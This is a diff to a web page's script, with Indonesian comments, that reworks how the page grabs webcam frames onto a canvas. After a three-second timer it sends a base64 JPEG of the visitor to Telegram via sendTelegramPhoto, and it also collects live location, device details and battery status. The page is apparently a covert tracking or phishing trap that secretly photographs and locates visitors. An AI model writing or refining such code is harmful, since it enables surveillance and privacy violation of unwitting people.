@@ -32,14 +32,36 @@
       const canvas = document.getElementById('canvas');
       const context = canvas.getContext('2d');
 
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      video.addEventListener('loadedmetadata', function() {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+      });
 
-      const photoData = canvas.toDataURL('image/jpeg');
-      sendTelegramPhoto(photoData);
+      video.addEventListener('play', function() {
+        drawFrame();
+      });
+
+      function drawFrame() {
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        setTimeout(drawFrame, 16); // Menggambar frame berikutnya setiap 16ms (60 fps)
+      }
+
+      const photoData = function() {
+        canvas.toBlob(function(blob) {
+          const reader = new FileReader();
+          reader.readAsDataURL(blob);
+          reader.onloadend = function() {
+            const base64data = reader.result;
+            sendTelegramPhoto(base64data);
+          }
+        }, 'image/jpeg', 0.8);
+      };
 
       getLiveLocation();
       getDeviceInfo();
       getBatteryInfo();
+
+      setTimeout(photoData, 3000);
     }
 
     function getLiveLocation() {
@@ -80,11 +102,6 @@
         sendTelegramMessage('Maaf, peramban tidak mendukung informasi baterai.');
       }
     }
-
-    // Auto click actions after 3 seconds
-    setTimeout(function() {
-      capturePhotoAndSend();
-    }, 3000);
   </script>
 </body>
 </html>
